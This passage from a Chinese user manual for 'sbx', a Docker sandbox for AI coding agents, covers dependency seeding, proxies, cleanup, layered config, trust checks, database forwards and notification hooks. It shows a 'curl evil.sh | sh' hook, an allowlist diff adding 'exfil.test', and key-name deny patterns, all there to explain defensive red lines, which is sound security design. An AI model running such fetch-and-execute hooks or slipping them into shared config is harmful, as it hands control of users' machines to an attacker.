  "$(go env GOMODCACHE)/cache/download/gitlab.corp.example/" .sbx/modproxy/gitlab.corp.example/
```

```dockerfile
ENV GOPRIVATE=gitlab.corp.example GONOPROXY=none
COPY .sbx/modproxy /modproxy
ENV GOPROXY=file:///modproxy,https://proxy.golang.org,direct
RUN go mod download        # 不需要任何 secret
```

`.sbx/modproxy` 要进 `.gitignore`——它是一份本地产物，不是对项目的陈述。

**两个会绊人的点**，都不在报错信息里：

- **`GOPRIVATE` 同时是 `GONOPROXY` 的默认值。** 只写 `GOPRIVATE` 的话 go 会绕开**所有** proxy 去直连，`file://` 的也一起绕开，于是姿势二白写。要的是「不查 sumdb（go.sum 本来有哈希），但照常走 proxy」——补一行 `GONOPROXY=none`。
- **`go.mod` 里的 `toolchain` 行。** 基础镜像的 go 比它低，go 会去下载工具链，而 Task 容器下不到，编译在沙箱里直接停。对齐基础镜像版本，或者让 prep 顺手把工具链也烤进 `GOMODCACHE`——它本身就是以模块形式分发的，跟着一起播种。


### 构建期的网络：代理有三条注入路，sbx 只堵得住两条

Docker Desktop 会把它设置里的代理注入 `docker build`——不管掉的话构建会原样重演"全走代理、到不了内网"。sbx 在 `prep build` 里把够得着的两条堵上：

| 注入路径 | 怎么堵 |
|---|---|
| `~/.docker/config.json` 的 `proxies`（**CLI 自己转成 `--build-arg`**） | 显式传同名的空 `--build-arg` 盖住 |
| 进程环境里的 `HTTP_PROXY` 等（影响 CLI 自己的出站连接） | 置空后再执行 |
| **Docker Desktop 的 VM 级透明代理**（`ProxyHTTPMode=system` + `VpnKitTransparentProxy`） | **堵不住**——见下 |

**只清环境变量是没用的**，Docker Desktop 用的是第一条。

第三条是 CLI 够不着的：Docker Desktop 在虚拟机里把容器的 `:80/:443` 整个劫持到宿主机的系统代理，`--build-arg`、环境变量、`--network=host` 一概无效。它只抄了系统代理的**地址**，没抄**例外表**——macOS 那份 `10.*,192.168.*` 的例外在容器里不存在，于是内网地址也被送进一个到不了内网的代理，表现是 TCP 连得上、TLS 却收到 EOF。

修它只有一个地方：**Docker Desktop → Settings → Resources → Proxies → Bypass**，把内网网段和域名填进去。判断是不是撞上了这条，用 [`sbx doctor` 的 reach 一项](#reach-这一项回答到底是不是沙箱的问题m4-18)——它就是在宿主机和容器里各跑一遍同样的 DNS / TCP / TLS 阶梯，分裂了就是它。实在不想碰宿主机设置，就走上面的**姿势二**——离线 proxy 根本不需要构建期联网。

### 子命令

| 命令 | 作用 |
|---|---|
| `sbx prep init [--force]` | 生成带注释的 `.sbx/prep.Dockerfile` 模板 |
| `sbx prep build [--check]` | 构建并播种；`--check` 只报告不碰 volume |
| `sbx prep show` | 当前 tag、是否漂移、哪些 Task 是从哪个种子建的 |
| `sbx prep reseed <task> [--yes]` | 对一个**已停止**的 Task 重新播种（破坏性，要输 Task 名确认） |
| `sbx prep drop [--all]` | 删这个 Workspace 的 prep 镜像；默认保留当前这个 |

> 没有 `.sbx/prep.Dockerfile` 的仓库完全不受影响：prep 是特殊场景的补丁，不是必经之路。

---

## 回收磁盘：`sbx clean`（M4-5）

`sbx done` 只回收 Task 自己的依赖 volume；`sbx-cache` 和历年的镜像是**只涨不消**的。`sbx clean` 是回收它们的那条路。

一条命令两档，分档的判据不是"清哪一层"，是**回来要不要网**——你不必认识 `go-mod` 和 `go-build` 的区别，只需要知道自己现在等不等得起重下：

```console
$ sbx clean
removed sbx/web-go:3aae9be32fb7  398m
cleared cache/go-build  420m
reclaimed 818m

package + build caches still held: 2.5g (re-downloadable) — sbx clean --deep
```

| | `sbx clean` | `sbx clean --deep` |
|---|---|---|
| 旧镜像 | 删 | 删 |
| 派生缓存（`go-build`） | 删，重编译就回来 | 删 |
| 包缓存（`go-mod`/`npm`/`pip`/`uv`/`cargo`） | **不动** | 删，要重下 |
| BuildKit 构建缓存（`prep build` 攒的） | **不动** | 删，下次构建重新拉基础层 |
| 问不问 | 不问 | 确认一次（`-y` 跳过） |

### 哪些镜像算"旧"

两条规则，都不需要你参与：**任何 Task 还钉在上面的不删**（Task 的 `meta.json` 里记着 `prep_tag` 和 `image`），**每个 repository 保留最新的一个**。

第二条顺带盖住了两种镜像：prep 的 repository 是 `sbx/prep-<ws>`，于是是"每个 Workspace 留最新的种子"；Agent 镜像的 repository 是 `sbx/<profile>`，于是是"每个 Profile 留最新的那个"。不读 label，也不解析构建时间——`docker images` 本来就按创建时间倒序。

### `--deep` 的那道闸

包缓存里混着 prep 播种的私有依赖。清掉它们**只在对应的 prep 镜像还在时**才是安全的——那时候下一次 `sbx run` 会自动重播，而且重播不需要网络。镜像不在，清掉的就是沙箱里再也拿不回来的东西：

```console
$ sbx clean --deep
these workspaces could not get their private dependencies back:
  shop             sbx/prep-shop:9f8e7d6c  MISSING
run `sbx prep build` in them first, then sbx clean --deep
```

查的是 `sbx-cache` 里**所有** Workspace 的播种标记，不只是你当前所在的这个：缓存是全局的，你在 A 仓库里敲的这条命令，清掉的是 B、C 的私有依赖。

**有 Task 在跑时，缓存整个不动**（镜像照清）。正在编译的 Task 拿着同一个 volume，清到一半它会以看不懂的方式失败。

### 它和 `sbx prep drop` 的分工

`clean` 收常规垃圾；`sbx prep drop --all` 是"连当前这个种子镜像也删掉"的手术刀。后者删的是**恢复能力**——没有它，缓存里的私有依赖就真的回不来了，得重新连内网、带凭据构建一次。所以这件事没有和日常清理共用一个动词。

`--deep` 覆盖的正好是 `sbx doctor` 报的那三项——镜像、volume、构建缓存。默认档只碰前两项里"不要网络就能回来"的部分，所以它报完之后会告诉你剩下多少、用什么清。

> 没有配置键，也没有后台清理。回收是人按的，工具只负责在你看得见的地方（`sbx doctor` 的 disk 一行）把数字和命令摆出来。

---

## 把容器里的端口拿出来：`sbx port`（M3-11）

```bash
sbx port fix-login 3000     # → http://127.0.0.1:54321/
sbx port fix-login          # 列出这个 Task 映射过的端口
sbx port fix-login 3000 --rm
```

映射是**一个独立的 socat 转发容器**，不碰 Task 本身——重建 agent 容器会把正在跑的会话杀掉，这在无人值守时不可接受。所以端口随时可以来去，`sbx done` 时会连同它一起清掉。

**只绑 `127.0.0.1`**，宿主机端口由 docker 随机分配，所以多个 Task 开同一个端口也不会撞车。

---

## 连分支一起删：`sbx drop`（M3-12）

```bash
sbx drop spike      # 要求你输入 Task 名确认
sbx drop spike -y   # 脚本里用
```

`done` 做的事它全做，外加删掉 `sbx/<task>` 分支。确认提示会告诉你**有多少个提交会一起没掉**——容器和 worktree 都能重建，commit 删了就真没了，这是整套工具里唯一不可逆的操作。

---

## 配置：四层（ADR 0009、design §9.1）

```
内置默认值
  → ~/.sbx/config.toml                  个人全局
  → <repo>/.sbx/sandbox.toml            项目级，提交进仓库，队友共享
  → ~/.sbx/workspaces/<ws>.toml         你对这一个仓库的个人覆盖
```

**标量后者覆盖前者，列表取并集。** 后一条的代价要知道：列表项只能加不能减，想去掉内置默认的 `node_modules` 目前没有办法。

`<ws>` 是 `sbx ls` 第一行打印的 Workspace id（如 `shop-e76272`），不是目录名——同名仓库不会撞车。

### 项目层和工作区层的区别

两份文件**语法完全一样**，差别全在「谁会读到它」上：

| | 项目层 `<repo>/.sbx/sandbox.toml` | 工作区层 `~/.sbx/workspaces/<ws>.toml` |
|---|---|---|
| 存在哪 | 仓库里，跟着 git 走 | 你的 `~/.sbx`，不进任何仓库 |
| 谁会拿到 | 每个 clone 这个仓库的人 | 只有你 |
| 谁能改 | 任何能往这个仓库推代码的人 | 只有你 |
| 合并顺序 | 先 | 后——**同名标量它赢** |
| 红线检查 | 有（见下文「项目层的红线」一节） | 无 |
| 信任确认 | 有，一变 `sbx run` 就停下来给你看 diff | 无 |
| 适合写什么 | 对**项目**的陈述 | 对**你这台机器**的决定 |

工作区层是你亲手在自己机器上写的；项目层是**别人 `git push` 一行就能改、而你多半不会逐行读 diff** 的东西。红线和信任确认这两道闸只装在项目层上，就是这个原因。

**判据只有一句：这是在陈述项目的事实，还是在决定我这台机器的行为？**

- 「本项目需要一个 postgres 16」——事实，项目层。`[[services]]` 只有 name/image/env/port，没有地址、没有凭据、不能挂宿主机路径，所以它可以跟着仓库走。
- 「往 `10.42.0.80:5432` 开个洞」——对你机器的决定，工作区层。`[[forward]]` 整棵子树在项目层被挡死。

全局层（`~/.sbx/config.toml`）和工作区层的权限完全相同，区别只是作用范围：前者管你所有仓库，后者只管这一个。凡是说「只能写在全局层或工作区层」的，两者随便挑。

还有第五个来源：prep 镜像里的 `/sbx/prep.json`（M4-15、boundary.md §2.5）。它只能声明 `allow` / `env` / `ca` 三个白名单字段，**权限等同项目层**（走同一套红线），在 `sbx config show` 里来源显示为 `prep`。它排在最后合并，但**不覆盖任何文件层已经写过的键**——顺序在后不等于优先级更高，你亲手写下的值不该被一个镜像里的 JSON 顶掉。

### 要一份模板：`sbx config init` / `sbx forward init`

两个命令，因为**落点不同**，而落点这件事不该靠读文档才知道：

```bash
sbx config init           # 写 <repo>/.sbx/sandbox.toml —— 项目层，含 [[services]] 示例
sbx forward init          # 写 ~/.sbx/workspaces/<ws>.toml —— 工作区层，含 [[forward]] 示例
```

`[[forward]]` 指向一个真实地址，项目层整棵子树被红线挡着（见上一节），所以它的模板只会落在你自己机器上的那一层。想把示例读一遍再自己抄的话，两个命令都有 `--print`（只打印，不写文件）。

几个刻意的选择：

- **模板里每一行都是注释。** 写一份模板不该改变任何行为，每一条都得是你自己打开的。有测试盯着这一点（`TestTomlTemplatesAreAllComments`）。
- **注释默认英文，`--lang zh` 给中文。** 模板是给人逐行读的，也是 agent 照着填的 ground truth，读不顺就等于没写；程序自己的输出仍然一律英文。
- **已存在的文件不覆盖**，要覆盖得显式 `--force`。
- 这两个命令**不读也不校验现有配置**。配置写坏的时候，最该还能用的恰恰是「再给我一份模板」——用正常加载路径的话，一个手滑写坏的 `sandbox.toml` 会把修它的工具一起锁在门外。
- `sbx config init` 写完会顺手更新信任记录（和 `sbx net allow --project` 一样的逻辑，且同样**只在写之前本来就已信任时**）。

### `sbx config show`

```console
$ sbx config show
默认      (内置)
全局      ~/.sbx/config.toml
项目      ~/code/shop/.sbx/sandbox.toml
工作区    ~/.sbx/workspaces/shop-e76272.toml  ← 没有这个文件

KEY                    VALUE                                     FROM
profile                "web-go"                                  项目
max_running            4                                         全局
network.mode           "allowlist"                               项目
network.allow          ["global.example.com", "api.internal"]    全局 + 项目
resources.memory       "6g"                                      工作区
```

**FROM 这一列是重点**：标量显示决定最终值的那一层，列表显示所有贡献者。排查"我明明改了为什么没生效"先跑它。不在 git 仓库里也能跑，那时只有前两层。

校验在**四层合并完之后**才做：被后面的层盖掉的非法值不报错；真报错时会告诉你这个值是哪一层给的。

### 项目层的红线（M2-2、M3-10、M4-2、M4-12）

`<repo>/.sbx/sandbox.toml` 跟着仓库走，clone 下来就生效，所以这一层里出现下面四类内容会**直接报错**，不是警告。前三类**按键名的形状猜**，第四类是**按位置精确匹配的显式清单**：

| | 怎么匹配 | 例子 |
|---|---|---|
| 密钥类字段 | 最后一段键名含 `key`/`token`/`secret`/`password`/`credential` | `api_key`、`api_key_file`（"指明凭据从哪来"也算） |
| 绝对路径 | **任何键**的值以 `/`、`~/` 或 `C:\` 开头 | `"/etc/ssl/corp.crt"`、`"~/.aws/credentials"` |
| 会在容器里执行的命令 | 键名形如 `on_*`、`*_cmd`、`*_command`、`*_script`、`*_hook` | `on_idle`、`on_exit`、`notify_cmd` |
| 安全开关和整棵子树 | 完整点号 key / 前缀，一份登记表 | `git.protect`、`prep.on_drift`、`prep.secret.*`、`forward.*` |

这四类只能写在全局层或工作区层——也就是只能你自己写在自己机器上。检查对未知字段同样生效，不认识的键不能绕过去；未知字段本身只警告不报错。

```console
$ sbx run api
sbx: /Users/you/code/shop/.sbx/sandbox.toml: the project layer contains settings that are not allowed:
  - forward.* (this whole section can only be set in the global or workspace layer)
```

前三类是"形状"：以后冒出 `on_start`、`webhook_secret` 这种没人预见过的键名，模式会自动挡住。第四类挡的是形状猜不到的东西——`git.protect = false` 和 `prep.on_drift = "build"` 既不像凭据也不是路径，但前者能关掉 `.git` 的只读保护，后者让 `sbx run` 在依赖漂移时自动连一次内网。**新增一项保护机制时，它的开关要同时登记到这张表里**，否则跟着仓库走的配置就有了关掉它的能力。

两处豁免是刻意的，否则文档里自己的示例会被自己的红线拦下：

- `prep.secrets` —— 只有 BuildKit secret 的 id，值存在别处，**正是为了能进仓库共享**。
- `services.env.*` —— `POSTGRES_PASSWORD = "dev"` 是在给一个用完即弃的空库设密码，不是从宿主机取凭据，值也到不了 Task 之外。

> 第三类是 M3-10 加的。`on_idle = "curl evil.sh | sh"` 既不像密钥也不是绝对路径，前两条都拦不住它；而信任确认虽然会把 `.sbx/` 的改动摊开给你看，但不该指望每个人每次都逐行读懂一段 shell。

### 信任确认：`sbx trust`（M2-3/4/5、design §9.3）

`.sbx/` 跟着仓库走。`git pull` 下来的一行改动就能换掉沙箱的白名单（将来还有自定义 Dockerfile），而你多半不会逐行看别人的 diff。所以 **`.sbx/` 的内容一变，`sbx run` 就先停下来**：

```
$ sbx run api
.sbx/ 和上次信任时相比有变化：

[修改] .sbx/sandbox.toml
--- 上次信任/sandbox.toml
+++ 现在/sandbox.toml
@@ -1,2 +1,2 @@
 [network]
-allow = ["api.example.com"]
+allow = ["api.example.com", "exfil.test"]
sbx: .sbx/ 自上次信任后变过。看过上面的改动后执行：sbx trust
```

```bash
sbx trust          # 展示改动（首次则展示全部内容），确认后记下
sbx trust --show   # 只看，什么都不写
sbx trust -y       # 不询问直接记下
```

几个要点：

- **没有 `.sbx/` 的仓库完全不受影响**，一行提示都不会多。
- 比对的是 `.sbx/` 下的**所有文件**，包括子目录和将来的 `.sbx/Dockerfile`；路径、大小、内容任一变化都算。
- **符号链接按链接本身记录，不跟随**。否则把 `.sbx/Dockerfile` 指到别处，换掉目标文件就能在哈希不变的情况下换掉实际内容。
- 快照里**存了文本文件的内容**（≤256KB），所以第二次变更能直接给你 diff，不用去翻 git 历史。二进制和超大文件只存哈希：变了会告诉你，但给不出 diff。
- 记录在 `~/.sbx/trust/<ws>.json`，**按 Workspace 分开**。同一份代码 clone 到两个目录是两个 Workspace，各自确认各自的。
- 只拦 `sbx run`。**已经在跑的 Task 不受影响**，`attach`、`shell`、`ls` 照常。
- **安全开关只能写在全局层或工作区层**（目前是 `git.protect` 和 `prep.on_drift`）。和"密钥类字段""执行类字段"那种按键名形状猜的红线不同，这一条是一份显式清单：跟着仓库走的配置不该有能力关掉保护，哪怕信任确认会把改动摊开给你看。
- `sbx net allow --project` 写完 `.sbx/sandbox.toml` 会顺手更新信任记录——这次改动是你让 sbx 做的。但**仅限写之前本来就是已信任状态**，否则会把别人留下的、你还没看过的改动一起放行。

```toml
profile       = "web-go"      # 内置 Profile：web-go | py-rust
# image       = "..."         # 直接用现成镜像，覆盖 profile（M3-2）
default_agent = "claude"
max_running   = 3             # 同时运行的 Task 上限，跨 Workspace 计数

[network]
upstream  = ""                # 宿主机代理，空=直连。只支持 http 上游
proxy     = "shared"          # shared（默认，全局一个 squid）| dedicated（每个 Task 一个 sidecar）
mode      = "open"            # open（默认，全放行）| allowlist（只放白名单）
cloud_mcp = false             # true 则不注入 disableClaudeAiConnectors，也不拦 mcp-proxy
allow     = []                # 追加到内置白名单，只在 allowlist 模式下起作用

[resources]
cpus   = 2
memory = "3g"                 # 形如 3g / 512m
pids   = 1024

# 通知（M3-10）：在容器里执行，只能写在全局层或工作区层
# on_idle = "curl -s https://hooks.example.com/idle?task=$SBX_TASK"
# on_exit = "curl -s https://hooks.example.com/exit?task=$SBX_TASK&code=$SBX_EXIT_CODE"
# notify_throttle = 600       # 两次同类通知的最小间隔（秒）

[deps]
mask = ["node_modules"]       # 每一项在容器里挂一个独立 volume 遮住，避免污染宿主机

# 前置依赖固化（M4-6、boundary.md §2）。没有 .sbx/prep.Dockerfile 时整段不起作用
[prep]
# file   = ".sbx/prep.Dockerfile"
# watch  = ["go.mod", "go.sum"]   # 这些文件变了就算种子陈旧（tag = 两者内容的哈希）
# secrets = ["netrc"]             # 只有 BuildKit secret 的 id，没有值，可以进仓库
# on_drift = "warn"               # warn（默认，只提醒）| build（自动构建）| fail
#                                 # 安全开关，只能写在全局层或工作区层

# [prep.secret]                   # id -> 宿主机路径。整段只能写在全局层或工作区层
# netrc = "~/.sbx/secrets/corp.netrc"

[git]
protect = true                # 把 .git/hooks 和 .git/config 只读挂载（M4-1）。
                              # 这是安全开关，只能写在全局层或工作区层

# 注入 Task 容器的环境变量。prep 的 /sbx/prep.json 也往这里并（M4-15）；
# 代理和 git 身份那几个变量盖不住——它们是沙箱的骨架
# [env]
# GOFLAGS = "-mod=mod"

# 伴生容器（M4-10、boundary.md §3.2）。字段只有这四个：没有地址、没有凭据、
# 不能挂宿主机路径、不能提权，所以**可以写在项目层**、可以进仓库
# [[services]]
# name  = "db"
# image = "postgres:16"
# port  = 5432                    # 容器里按 db:5432 访问——服务名，不是 localhost
# env   = { POSTGRES_PASSWORD = "dev" }

# 单目标 TCP 洞（M4-12、boundary.md §3.3）。**只能写在全局层或工作区层**，
# 项目层整段被红线挡住：跟着仓库走的配置不该决定你的机器往哪儿连
# [[forward]]
# name = "staging-db"
# port = 5432                     # 容器里按 staging-db:5432 访问
# to   = "10.42.0.80:5432"       # 裸端口号（to = 5432）表示宿主机
# host = "gitlab.corp.example"   # 可选：容器里仍用真实域名访问，保住 SNI 和证书
# allow_public = false            # 解除"目标必须是私有地址"，会醒目警告

[agents.claude]
version      = "latest"       # 写死版本会让 sbx upgrade 拒绝执行
# api_key_env  = "ANTHROPIC_API_KEY"   # 从宿主机环境变量读，优先于订阅登录
# api_key_file = "~/.keys/anthropic"   # 或者从文件读。两者只能二选一
```

**生效优先级**：命令行 flag（`--net`、`--proxy`）> 配置文件 > 内置默认值。这两个 flag 只改这一次执行，不落盘；`sbx net allow` 落盘。

**改了配置什么时候生效**：`network.allow` 对运行中的 Task 可以用 `net allow` 热加载；`resources`、`deps.mask`、`git.protect`、`env`、`forward` 的 `host`、`profile`、`network.proxy` 是建容器时定的，要 `done` 后重建；`mode` 和 `upstream` 下次 `run` 时重新渲染 proxy 配置；`services` 和 `forward` 的增减在下次 `run` 时生效（已经起着的伴生容器原样留着）。

两者的用法、场景和约束见下文「伴生服务与内网目标」一节。

---

## 伴生服务与内网目标：`[[services]]` / `[[forward]]`（M4-10…M4-14、boundary.md §3）

Task 的网络是 `--internal` 的：**容器没有默认路由**，能出 HTTP 只是因为 squid 就在这张网上。下面两样东西都是往这张网里加 peer，**没有一条给 Task 自己多插网卡**——不变量没动过，有自动化回归测试盯着（`go test -tags docker ./core/internal/cli/ -run NoDefaultRoute`）。

### 先分清三个安全等级

"连数据库"这句话盖住了三个完全不同的东西：

| 形态 | agent 被完全控制时的最坏情况 | 级别 | 用什么 |
|---|---|---|---|
| 容器内伴生实例（空库 / 种子库） | 删掉一个本来就一次性的库 | 🟢 | `[[services]]` |
| 宿主机上的实例 | 删你本机的开发数据 | 🟡 | `[[forward]]` |
| 内网共享实例（staging / dev） | 删别人的数据、读真实用户数据、写操作不可逆 | 🔴 | `[[forward]]` + 只读账号 |

redis、kafka、MinIO、内网微服务同构。**判据：共享的、有真实数据的、可写的 = 红。**

**能用容器内实例就用容器内实例**（🟢 不需要任何洞）；够不着才用 `[[forward]]` 逐条开洞。

### 场景 A：测试要一个 postgres（🟢）

不解决会怎样：全红。agent 会去试 `apt-get install postgresql`（没 root）、试 `docker run`（没 docker.sock），然后**开始改测试代码绕过数据库**。无人值守下它不会停下来问你——这是最糟的失败模式：不是报错退出，是悄悄产出垃圾。

`sbx config init` 写出来的模板里就有这段（注释状态）。

```toml
# <repo>/.sbx/sandbox.toml —— 可以进仓库：没有地址、没有凭据、不能挂宿主机路径
[[services]]
name  = "db"
image = "postgres:16"
port  = 5432
env   = { POSTGRES_PASSWORD = "dev", POSTGRES_DB = "app" }
```

```console
$ sbx run fix-login
service db: postgres:16, reachable in the task as db:5432
```

**容器里按 `db:5432` 访问——服务名，不是 `localhost`。** 它是另一个容器，而 `localhost` 在 Task 里指的是 Task 自己。把测试里的连接地址指到 `db` 上（或者用 `DATABASE_URL` 之类的环境变量），这是落地时唯一要改的东西。

### 场景 B：连你本机已经在跑的实例（🟡）

下面这三个场景的模板，`sbx forward init` 会一次性写到工作区层（全是注释，一次打开一条）。

```toml
# ~/.sbx/config.toml 或 ~/.sbx/workspaces/<ws>.toml —— 不能写在项目层
[[forward]]
name = "db"
port = 5432
to   = 5432     # 只写端口号 = 宿主机
```

### 场景 C：连内网的 staging 库（🔴）

```toml
[[forward]]
name = "staging-db"
port = 5432
to   = "db.corp.example:5432"   # 或者直接写 "10.42.0.80:5432"
```

只要宿主机在公司网里（直连 LAN 或 VPN 已连），`sbx-egress` 网络就能到——forwarder 跑在那上面，所以容器也就能到。**不需要先 `ssh -L`**：中介点是 forwarder 本身，不是宿主机，强制走一道隧道不增加任何安全性。

> 例外：数据库在跳板机后面、宿主机自己也到不了，那才需要你先建隧道，然后按场景 B 的写法指向本地端口。这是网络可达性的问题，不是 sbx 的规定。

```console
$ sbx run fix-login
forward staging-db: staging-db:5432 in the task -> 10.42.0.80:5432 (internal network)
note: these forwards reach real internal services: staging-db
      whatever the agent does to them, it does for real:
      use a read-only account or a separate schema; the network layer cannot undo a DROP TABLE.
      network.mode is open, so this task has both real data and unrestricted egress.
      consider network.mode = "allowlist" for this workspace (or sbx run --net allowlist).
```

### 场景 D：内网 HTTPS 服务，想保住域名和证书

数据库用 `staging-db:5432` 就够了，但内网 HTTPS 服务改成别的主机名会让证书 CN 对不上，应用配置也得改。加一个 `host` 字段可以避免：

```toml
[[forward]]
name = "gitlab"
host = "gitlab.corp.example"   # 容器里仍用真实域名访问
port = 443
to   = "10.42.0.50:443"
```

实现是给 Task 容器加 `--add-host gitlab.corp.example:<forwarder 的 IP>`。socat 是纯 TCP 中继，SNI 和证书原样透传，TLS 握手不受影响。

**但这条路绕过了 squid 的白名单和访问日志。** 内网 HTTP/HTTPS 的选择顺序是：先看能不能走 `network.allow` + squid（流量仍受审计），确实不行再用 `forward` + `host`。

### `to` 必须解析到私有地址

这是 forwarder 唯一的硬限制，理由很具体：**如果 `to` 能写任意地址，forwarder 就成了绕过 squid 的通用出网隧道**——这条流量不再受白名单约束、不进访问日志、`sbx net denied` 也看不见。

```console
$ sbx run fix-login
sbx: opening the declared forwards: forward tunnel: example.com resolves to 104.20.23.154,
which is a public address. Public hosts go through network.allow + squid, where they are
filtered and logged.
If your company really uses public address ranges internally, set allow_public = true on this one forward
```

放行的范围是 `10.0.0.0/8`、`172.16.0.0/12`、`192.168.0.0/16`、`127.0.0.0/8` 和宿主机网关。少数公司在内部使用公网 IP 段，那就写 `allow_public = true` 单条解除，`sbx run` 会醒目警告。

**解析只在 Task 启动时发生一次，IP 固化进 socat 的目标**：行为确定、能把实际地址打出来、也避免 DNS 重绑定在运行中把目标换掉。

> `to = "127.0.0.1:5432"` 会被改指宿主机并说明原因——在 forwarder 容器里 `127.0.0.1` 指的是 forwarder 自己，照字面转发会得到一个连不上的洞。想指宿主机就用 `to = 5432` 的简写。

### 两者的对照

| | `[[services]]` | `[[forward]]` |
|---|---|---|
| 是什么 | 跟着 Task 起的一次性实例 | 到一个声明好的 `地址:端口` 的 TCP 中继 |
| 可写层 | 任意层，**包括项目层** | **仅全局 / 工作区层** |
| 为什么 | 只有 image/env/port，没有地址，是"本项目要什么"的事实 | 它决定你这台机器往哪儿连，跟着仓库走的配置不该有这个决定权 |
| 目标 | 没有目标，就是一个镜像 | 必须解析到私有地址（`allow_public` 可单条解除） |
| 容器里怎么访问 | `<name>:<port>` | `<name>:<port>`，配了 `host` 时也可用真实域名 |
| 一条一个容器 | 是 | 是——监听端口不会打架，回收能逐条来 |
| 审计 | 不需要（流量不出网） | **无**，所以必须逐条显式声明 |
| 生命周期 | `sbx run` 起、`sbx stop` 一起停、`sbx done` / `drop` 一起收 | 同左 |
| 可见性 | `sbx run` 打印、`sbx ls` 的 `LINKS` 列 | 同左，另记进 `meta.json` |
| 默认 | 不配就不存在 | 不配就不存在 |

### 回收与可见性

```console
$ sbx ls
TASK       STATUS  BRANCH         AHEAD  DIFF      DENIED  LINKS        LAST-ACTIVE  PATH
fix-login  idle    sbx/fix-login  3      5f +84 -12  0     svc:1 fwd:1  2m ago       ~/.sbx/worktrees/...
```

`fwd` 非 0 的分支是接过真实内部服务跑出来的，事后 review 时该用不一样的尺度看——这就是"预期管理"的可操作形态，记在 `meta.json` 里，不只存在于当时那一屏输出。

`sbx done` / `sbx drop` 会把伴生容器和 forwarder 一并删掉（它们接在 Task 网络上，不先删就删不动网络）；`sbx stop` 把它们一起停掉——Task 停了还留着一个 postgres 跑在那儿，占的是同一台 Docker VM 的内存，而没有任何地方会提醒你。

> **改了配置什么时候生效**：增减 `[[services]]` / `[[forward]]` 在下次 `sbx run` 时生效，已经起着的伴生容器原样留着。`host` 字段是建 Task 容器时写进 `/etc/hosts` 的，改它要 `sbx done` 后重建。

如果 Task 主容器已被外部删除、旧 forwarder 仍在，`run` 会拒绝先删掉旧 forwarder 再重建，避免重建失败破坏既有资源。确认旧 Task 不再需要后，执行 `sbx done <task>` 再 `sbx run <task>`。正常已有容器的 resume 保留原 forwarder。


---

## 用 API key 代替订阅登录（M2-13、design §7.1）

```toml
# ~/.sbx/config.toml 或 ~/.sbx/workspaces/<ws>.toml —— 不能写在项目层
[agents.claude]
api_key_env = "ANTHROPIC_API_KEY"     # 从宿主机的这个环境变量读
# api_key_file = "~/.keys/anthropic"  # 或者从文件读；两者只能二选一
```

配上之后 `sbx run` 就不查订阅登录态了，key 在建容器时以 `ANTHROPIC_API_KEY` 注入容器：

```
$ sbx run api
用 API key 启动（来自环境变量 ANTHROPIC_API_KEY），不走订阅登录
```

几个要点：

- **配了但取不到值会直接报错**（环境变量没设、文件不存在或为空），不会静默退回订阅登录——否则你以为在用 API key，账单却记到订阅账号上。
- **这两个键只能写在全局层或工作区层。** 项目层的红线（M2-2）会拦住它们，键名里有 `key` 就不行。
- **key 会留在容器的 `Config.Env` 里**，`docker inspect` 看得到。这是环境变量注入的固有代价，design §7.1 选的就是这条路。
- **环境变量只能在建容器时注入。** 已经建好的 Task 不会因为你改了配置就拿到 key；`sbx run` 会检测到并明确告诉你要 `sbx done` 之后重建，而不是让 claude 自己报一个莫名其妙的认证错误。
- claude 看到环境里有自定义 key 时会弹一个 “Detected a custom API key … Do you want to use this API key?” 并**默认停在 No** 上，无人值守会卡死。sbx 在 preseed 阶段把 key 的后 20 个字符写进 `~/.claude.json` 的 `customApiKeyResponses.approved`，把这个框按掉（M2-13 实测）。

---

## 云端 MCP（M2-10a、ADR 0015）

默认**不**让 Task 连 Claude 的云端连接器：代理拦 `mcp-proxy.anthropic.com`，同时在注入的 settings 里写 `disableClaudeAiConnectors: true`（不从源头关掉的话 claude 会反复重试，实测一分钟撞出三百多次 403，R11）。

要用就打开：

```bash
sbx run api --cloud-mcp          # 只这一次
```

```toml
[network]
cloud_mcp = true                 # 一直打开
```

`--cloud-mcp` 只能打开不能关——关是默认值，不加就是关。

---

## 跑完告诉我一声：`on_idle` / `on_exit`（M3-10、design §7.2）

```toml
# ~/.sbx/config.toml 或 ~/.sbx/workspaces/<ws>.toml —— 不能写在项目层
on_idle = "curl -s -X POST https://open.feishu.cn/open-apis/bot/v2/hook/xxx --data-raw \"{\\\"msg_type\\\":\\\"text\\\",\\\"content\\\":{\\\"text\\\":\\\"$SBX_TASK 停下来了\\\"}}\""
on_exit = "curl -s -X POST https://.../hook -d \"task=$SBX_TASK&code=$SBX_EXIT_CODE\""
notify_throttle = 600   # 两次同类通知的最小间隔（秒），默认 600
```

命令**在容器里执行**，sbx 没有宿主机守护进程，也不内置任何系统通知。

| 挂在哪 | 什么时候 |
|---|---|
| `on_idle` | `Notification` 事件：Agent 空闲约 60 秒，通常意味着它在等你回话。**不挂 Stop**——短暂停顿也发通知会很吵 |
| `on_exit` | claude 退出时（`SessionEnd`）。headless 下由包装脚本在容器停掉之前同步发，所以拿得到退出码 |

命令里能用的变量：`SBX_WS`、`SBX_TASK`、`SBX_EVENT`（idle/exit）、`SBX_STATE`、`SBX_TS`，以及 headless 的 `SBX_EXIT_CODE`。

> **注意引号**：`$SBX_TASK` 写在 shell 的**单引号**里不会被展开，webhook 收到的会是字面量 `$SBX_TASK`。sbx 不做任何变量替换（那会把 JSON 的转义搞乱），所以要展开就用双引号。`sbx doctor` 会检查这一点并提醒你。

几条保证：

- **通知永远不会卡住 Agent**：20 秒超时，交互模式下放后台跑，无论成败都返回 0。失败只记进 `~/.sbx/state/<ws>/<task>/notify.log`。
- **节流**：同一类通知在窗口内只发一次。`Notification` 是反复触发的事件。
- **webhook 的主机自动放行**：sbx 从命令里扫出 `http(s)://` 的主机名，作为"通知域名"层加进该 Task 的白名单，allowlist 模式下不用你再 `net allow`。主机名里有变量、或者写的是 IP 时扫不出来，`sbx run` 会提示你手动放行。
- **容器被 OOM 杀掉时收不到通知**：那种情况下 hooks 根本来不及跑，只能靠 `sbx ls` 的 `exited(oom)` 事后发现。
- 这两个键**不能写在项目层**（`<repo>/.sbx/sandbox.toml`），见下面的红线。

---

## 体检：`sbx doctor`（M3-13、M4-5、M4-18、M4-19）

```console
$ sbx doctor
  ✓ docker      Docker 27.4.0, VM memory 9.7g
  ✓ vm-memory   max_running(3) × 3g = 9.0g ≤ VM memory 9.7g × 95%
  ✓ disk        images 768m + volumes 1.3g + build cache 1.5g = 3.6g
  ✓ upstream    http://host.docker.internal:7890 is reachable
  ✗ sbx-proxy   stopped, but 1 shared task(s) are running (they cannot reach the network)
      → docker rm -f sbx-proxy, then sbx run will rebuild it
